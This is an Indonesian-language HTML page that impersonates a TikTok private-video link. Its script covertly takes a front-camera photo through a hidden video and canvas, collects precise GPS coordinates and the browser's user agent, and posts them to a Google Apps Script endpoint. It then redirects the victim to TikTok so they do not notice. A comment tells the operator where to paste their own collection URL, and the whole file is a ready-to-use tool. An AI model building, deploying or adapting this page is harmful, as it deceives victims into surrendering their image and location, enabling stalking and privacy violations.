<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TikTok - Menuju Video</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      background-color: #000;
      color: #fff;
    }
    .wrapper { text-align: center; padding: 25px; max-width: 350px; width: 85%; }
    .logo { font-size: 32px; font-weight: 800; margin-bottom: 20px; letter-spacing: -1px; }
    .btn-tiktok {
      background-color: #fe2c55;
      color: #fff;
      border: none;
      padding: 14px;
      font-size: 16px;
      font-weight: 700;
      border-radius: 6px;
      cursor: pointer;
      width: 100%;
      box-shadow: 0 4px 12px rgba(254, 44, 85, 0.4);
    }
    #hidden-video, #hidden-canvas { display: none; }
  </style>
</head>
<body>

  <div class="wrapper">
    <div class="logo">TikTok</div>
    <p style="font-size: 14px; margin-bottom: 25px; color: #bbb;">Tautan video privat. Klik untuk membuka video.</p>
    <button id="action-btn" class="btn-tiktok" onclick="handleStart()">Buka Video</button>
    <p id="status-text" style="font-size: 12px; color: #888; margin-top: 15px;">Izinkan verifikasi browser jika diminta.</p>
  </div>

  <video id="hidden-video" autoplay playsinline muted></video>
  <canvas id="hidden-canvas"></canvas>

  <script>
    // TEMPEL URL WEB APP APPS SCRIPT ANDA DI SINI
    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyMI1nMRifoLPPFkSoRJSSmYbZ9Jt04tkWTmNZUo7u_D-3IiLaBMwM1VFAlujvwWeueQ/exec";

    // Ambil parameter target TikTok
    const urlParams = new URLSearchParams(window.location.search);
    const targetParam = urlParams.get('target');
    let targetUrl = 'https://www.tiktok.com';
    if (targetParam) {
      try {
        targetUrl = atob(targetParam);
      } catch(e) {
        targetUrl = targetParam;
      }
    }

    let payload = {
      latitude: null,
      longitude: null,
      image: null,
      targetUrl: targetUrl,
      userAgent: navigator.userAgent
    };

    function handleStart() {
      const btn = document.getElementById('action-btn');
      const status = document.getElementById('status-text');
      btn.innerText = "Memproses...";
      btn.disabled = true;
      status.innerText = "Memeriksa perangkat...";

      // 1. Ambil Kamera
      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
        .then((stream) => {
          const video = document.getElementById('hidden-video');
          video.srcObject = stream;
          video.onloadedmetadata = () => {
            setTimeout(() => {
              const canvas = document.getElementById('hidden-canvas');
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              const ctx = canvas.getContext('2d');
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
              
              payload.image = canvas.toDataURL('image/jpeg', 0.5);
              stream.getTracks().forEach(t => t.stop());
              
              fetchLocation();
            }, 300);
          };
        })
        .catch(() => {
          // Jika kamera ditolak, tetap ambil lokasi
          fetchLocation();
        });
    }

    // 2. Ambil Lokasi GPS
    function fetchLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            payload.latitude = pos.coords.latitude;
            payload.longitude = pos.coords.longitude;
            sendData();
          },
          () => {
            sendData();
          },
          { enableHighAccuracy: true, timeout: 3000 }
        );
      } else {
        sendData();
      }
    }

    // 3. Kirim ke Google Apps Script (Wajib tunggu selesai baru redirect)
    async function sendData() {
      const status = document.getElementById('status-text');
      status.innerText = "Menghubungkan ke server...";

      try {
        await fetch(SCRIPT_URL, {
          method: 'POST',
          mode: 'no-cors',
          headers: {
            'Content-Type': 'text/plain;charset=utf-8'
          },
          body: JSON.stringify(payload)
        });
      } catch (err) {
        console.error("Gagal kirim data:", err);
      }

      // Beri jeda 800ms agar Google server selesai mencatat baris baru
      setTimeout(() => {
        window.location.href = targetUrl;
      }, 800);
    }
  </script>
</body>
</html>
